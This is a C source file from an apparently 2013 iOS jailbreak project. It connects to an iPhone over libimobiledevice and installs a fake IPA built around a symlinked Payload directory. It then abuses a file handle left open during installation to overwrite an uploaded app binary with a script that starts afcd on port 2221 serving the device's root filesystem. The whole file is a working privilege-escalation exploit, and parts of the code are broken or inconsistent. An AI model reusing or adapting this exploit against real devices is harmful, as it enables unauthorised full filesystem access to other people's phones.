/**
 * racism - racism.c
 * Copyright (C) 2013 Crippy-Dev Team
 * Copyright (C) 2013 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/installation_proxy.h>

uint64_t gFh = 0;
unsigned int cb = 0;
unsigned int installing = 1;

idevice_t gDevice = NULL;
afc_client_t gAfc = NULL;
lockdownd_client_t gLockdown = NULL;
instproxy_client_t gInstproxy = NULL;

int afc_send_file(afc_client_t afc, const char* local, const char* remote) {
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "rb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_WR, &fh);
		if (err == AFC_E_SUCCESS) {

			while (!feof(fd)) {
				memset(buffer, '\0', sizeof(buffer));
				got = fread(buffer, 1, sizeof(buffer), fd);
				printf("Read %d bytes\n", got);
				if (got > 0) {
					afc_file_write(afc, fh, (const char*) buffer, got, &gave);
					printf("Wrote %d bytes\n", gave);
					if (gave != got) {
						printf("Error!!\n");
						break;
					}
				}
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return -1;
	printf("Copied %s -> %s\n", local, remote);
	return 0;
}

static int afc_remove_directory(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		printf("Could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL ) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*) malloc(strlen(path) + 1 + strlen(*ptr) + 1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i += 2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i + 1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			afc_remove_directory(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
}

static void cp_recursive(const char* from, const char* to) {
	if (!from || !to) {
		return;
	}
	DIR* cur_dir = opendir(from);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(from, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			if (stat(to, &tst) != 0) {
				printf("creating new folder at %s", to);
				mkdir(to, fst.st_mode);
			}
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(to) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(from) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, from);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, to);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					printf("copying folder %s to %s\n", fpath, tpath);
					cp_recursive(fpath, tpath);
				} else {

					printf("copying file %s to %s\n", fpath, tpath);
					if (cp(fpath, tpath) != 0) {
						printf("could not copy file %s\n", fpath);
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return;
}

static void mv_recursive(const char* from, const char* to) {
	cp_recursive(from, to);
	rm_recursive(from);
}

static afc_send_directory(afc_client_t* afc, const char* local,
		const char* remote) {
	if (!local || !remote) {
		return;
	}
	DIR* cur_dir = opendir(local);
	if (cur_dir) {
		struct stat tst;
		struct stat fst;
		if ((stat(local, &fst) == 0) && S_ISDIR(fst.st_mode)) {
			afc_make_directory(afc, remote);
		}
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0)
					|| (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}

			char *tpath = (char*) malloc(
					strlen(remote) + 1 + strlen(ep->d_name) + 1);
			char *fpath = (char*) malloc(
					strlen(local) + 1 + strlen(ep->d_name) + 1);
			if (fpath && tpath) {
				struct stat st;
				strcpy(fpath, local);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				strcpy(tpath, remote);
				strcat(tpath, "/");
				strcat(tpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					printf("copying folder %s to %s\n", fpath, tpath);
					afc_send_directory(afc, fpath, tpath);
				} else {

					printf("copying file %s to %s\n", fpath, tpath);
					if (afc_send_file(afc, fpath, tpath) != 0) {
						printf("could not copy file %s\n", fpath);
					}
				}

				free(tpath);
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	return;
}

afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
		const char* local) {
	int exit = 0;
	FILE* fd = NULL;
	uint64_t fh = 0;
	afc_error_t err = 0;
	unsigned int got = 0;
	unsigned int gave = 0;
	unsigned char buffer[0x800];

	fd = fopen(local, "wb");
	if (fd != NULL ) {
		err = afc_file_open(afc, remote, AFC_FOPEN_RDONLY, &fh);
		if (err == AFC_E_SUCCESS) {

			while (1) {
				memset(buffer, '\0', sizeof(buffer));
				err = afc_file_read(afc, fh, (const char*) buffer,
						sizeof(buffer), &got);
				if (err == AFC_E_SUCCESS && got > 0) {
					gave = fwrite(buffer, 1, got, fd);
					if (err != AFC_E_SUCCESS || gave != got)
						break;

				} else
					break;
			}

			afc_file_close(afc, fh);
		}
		fclose(fd);
	} else
		return err;

	printf("Copied %s -> %s\n", remote, local);
	return err;
}

void status_cb(const char *operation, plist_t status, void *unused) {
	cb++;
	printf("Callback %d - ", cb);
	if (cb == 8) {
		printf("Inject NOW!!!\n");
		//char **list = NULL;
		//afc_read_directory(gAfc, "/PrivateStaging/afc3.app", &list);
		//printf("Directory contents:\n");
		//if (list) {
		//	while (list[0]) {
		//		if (strcmp(list[0], ".") && strcmp(list[0], "..")) {
		//			puts(list[0]);
		//		}
		//		list++;
		//	}
		//}
	}
	if (status && operation) {
		plist_t npercent = plist_dict_get_item(status, "PercentComplete");
		plist_t nstatus = plist_dict_get_item(status, "Status");
		plist_t nerror = plist_dict_get_item(status, "Error");
		int percent = 0;
		char *status_msg = NULL;
		if (npercent) {
			uint64_t val = 0;
			plist_get_uint_val(npercent, &val);
			percent = val;
			printf("[%%%02d]", percent);
		}
		if (nstatus) {
			plist_get_string_val(nstatus, &status_msg);
			printf(" %s\n", status_msg);
			if (!strcmp(status_msg, "Complete")) {
				printf("Operation completed\n");
				sleep(1);
				installing = 0;
			}
		}

		if (nerror) {
			char *err_msg = NULL;
			plist_get_string_val(nerror, &err_msg);
			printf(" Error: %s\n", operation, err_msg);
			free(err_msg);
			installing = 0;
		}
	} else {
		printf("%s: called with invalid data!\n", __func__);
	}
}

int install_ipa(idevice_t device, const char* ipa) {
	int x = 0;

	printf("Connecting to lockdownd\n");
	lockdownd_error_t le = 0;
	lockdownd_client_t lockdown = NULL;
	le = lockdownd_client_new_with_handshake(device, &lockdown,
			"installclient");
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to pair with lockdownd\n");
		return -1;
	}

	printf("Starting AFC service\n");
	lockdownd_service_descriptor_t port = NULL;
	le = lockdownd_start_service(lockdown, "com.apple.afc", &port);
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to start AFC service\n");
		lockdownd_client_free(lockdown);
		return -1;
	}
	lockdownd_client_free(lockdown);

	printf("Connecting to AFC service\n");
	afc_error_t ae = 0;
	afc_client_t afc = NULL;
	ae = afc_client_new(device, port, &afc);
	if (ae != AFC_E_SUCCESS) {
		printf("Unable to create new AFC client\n");
		return -1;
	}

	printf("Copying fake application to device\n");
	const char* ipa_file = strrchr(ipa, '/');
	if (ipa_file == NULL ) {
		// There were no slashes in the path
		ipa_file = ipa;
	} else {
		// We found a slash so let's get the file name
		ipa_file++;
	}
	char dest[0x100];
	memset(dest, '\0', sizeof(dest));
	strncpy(dest, "/PublicStaging/", sizeof(dest));
	strncat(dest, ipa_file, sizeof(dest));
	x = afc_send_file(afc, ipa, dest);
	if (!x) {
		printf("Copied fake application to staging directory\n");
	} else {
		printf("Unable to copy fake application to staging directory\n");
		afc_client_free(afc);
		return -1;
	}
	printf("Disconnecting form AFC service\n");
	afc_client_free(afc);

	printf("Connecting to lockdownd\n");
	le = lockdownd_client_new_with_handshake(device, &lockdown,
			"installclient");
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to connect to lockdownd\n");
		return -1;
	}

	printf("Starting installation proxy service\n");
	le = lockdownd_start_service(lockdown,
			"com.apple.mobile.installation_proxy", &port);
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to start installation proxy service\n");
		lockdownd_client_free(lockdown);
	}
	lockdownd_client_free(lockdown);

	printf("Connecting to installation proxy service\n");
	instproxy_error_t ie = 0;
	instproxy_client_t instproxy = NULL;
	ie = instproxy_client_new(device, port, &instproxy);
	if (ie != INSTPROXY_E_SUCCESS) {
		printf("Unable to create new installation proxy client\n");
		return -1;
	}

	plist_t opts = instproxy_client_options_new();
	ie = instproxy_install(instproxy, dest, opts, &status_cb, NULL );
	if (ie != INSTPROXY_E_SUCCESS) {
		printf("Unable to install fake application\n");
		instproxy_client_options_free(opts);
		instproxy_client_free(instproxy);
	}

	while (installing) {
		sleep(1);
	}

	printf("Disconnecting from installation proxy\n");
	instproxy_client_options_free(opts);
	instproxy_client_free(instproxy);
	return 0;
}

int create_fake_ipa(const char* docs) {
	unlink("./Payload");
	int x = symlink(docs, "./Payload");
	printf("Symlinked %s to %s\n", docs, "./Payload");
	char command[0x100];
	memset(command, '\0', sizeof(command));
	snprintf(command, sizeof(command), "zip --symlink -r fake.ipa ./Payload");
	unlink("./fake.ipa");
	system(command);
	printf("Zipped up payload\n");
	return 0;
}

int main(int argc, char* argv[]) {
	idevice_error_t de = 0;
	de = idevice_new(&gDevice, NULL );
	if (de != IDEVICE_E_SUCCESS) {
		printf("Unable to connect to device\n");
		return -1;
	}

	lockdownd_error_t le = 0;
	le = lockdownd_client_new_with_handshake(gDevice, &gLockdown, "racism");
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to connect to lockdown\n");
		idevice_free(gDevice);
		return -1;
	}

	lockdownd_service_descriptor_t port = NULL;
	le = lockdownd_start_service(gLockdown, "com.apple.afc", &port);
	if (le != LOCKDOWN_E_SUCCESS) {
		printf("Unable to start AFC service\n");
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}

	afc_error_t ae = 0;
	ae = afc_client_new(gDevice, port, &gAfc);
	if (ae != AFC_E_SUCCESS) {
		printf("Unable to create new AFC client\n");
		lockdownd_client_free(gLockdown);
		idevice_free(gDevice);
		return -1;
	}
	lockdownd_client_free(gLockdown);
	gLockdown = NULL;

	ae = afc_make_directory(gAfc, "/PublicStaging");
	if (ae != AFC_E_SUCCESS) {
		printf("Unable to create PrivateStaging directory\n");
		afc_client_free(gAfc);
		idevice_free(gDevice);
		return -1;
	}

	ae = afc_make_directory(gAfc, "/PrivateStaging");
	if (ae != AFC_E_SUCCESS) {
		printf("Unable to create PrivateStaging directory\n");
		afc_client_free(gAfc);
		idevice_free(gDevice);
		return -1;
	}

	char* cwd = realpath(".", NULL);
	printf("%s\n", cwd);
	if (cwd != NULL ) {
		char* app = (char*) malloc(strlen(cwd) + sizeof("afc3.app") + 2);
		strcpy(app, cwd);
		strcat(app, "/");
		strcat(app, "afc3.app");
		printf("Sending %s to remote system\n", app);
		afc_send_directory(gAfc, app, "/PrivateStaging/afc3.app");
	}

	/*
	 ae = afc_make_directory(gAfc, "/FakeStaging");
	 if (ae != AFC_E_SUCCESS) {
	 printf("Unable to create FakeStaging directory\n");
	 afc_client_free(gAfc);
	 idevice_free(gDevice);
	 return -1;
	 }
	 */

	afc_file_open(gAfc, "/PrivateStaging/afc3.app/afc3", AFC_FOPEN_RW, &gFh);

	create_fake_ipa("/var/mobile/Media/PrivateStaging");
	install_ipa(gDevice, "fake.ipa");
	while (installing) {
		printf("Waiting for installation to finish...\n");
		sleep(1);
	}
	printf("Done installing, let's see if the handle is still open }:)\n");
	// Let's see if that handle is still open =D
	printf("Sleeping for 5 second just to be sure\n");
	int i = 0;
	for (i = 0; i < 5; i++) {
		printf(".");
		fflush(stdout);
		sleep(1);
	}
	printf("\n");
	uint32_t bw = 0;
	afc_file_truncate(gAfc, gFh, 0);
	char* command = "#!/usr/libexec/afcd -S -p 2221 -d / \n ";
	afc_file_write(gAfc, gFh, command, strlen(command) - 1, &bw);
	if (bw > 0) {
		printf("Successfully wrote %d bytes\n", bw);
	}
	afc_file_close(gAfc, gFh);

	afc_client_free(gAfc);
	idevice_free(gDevice);
	return 0;
}
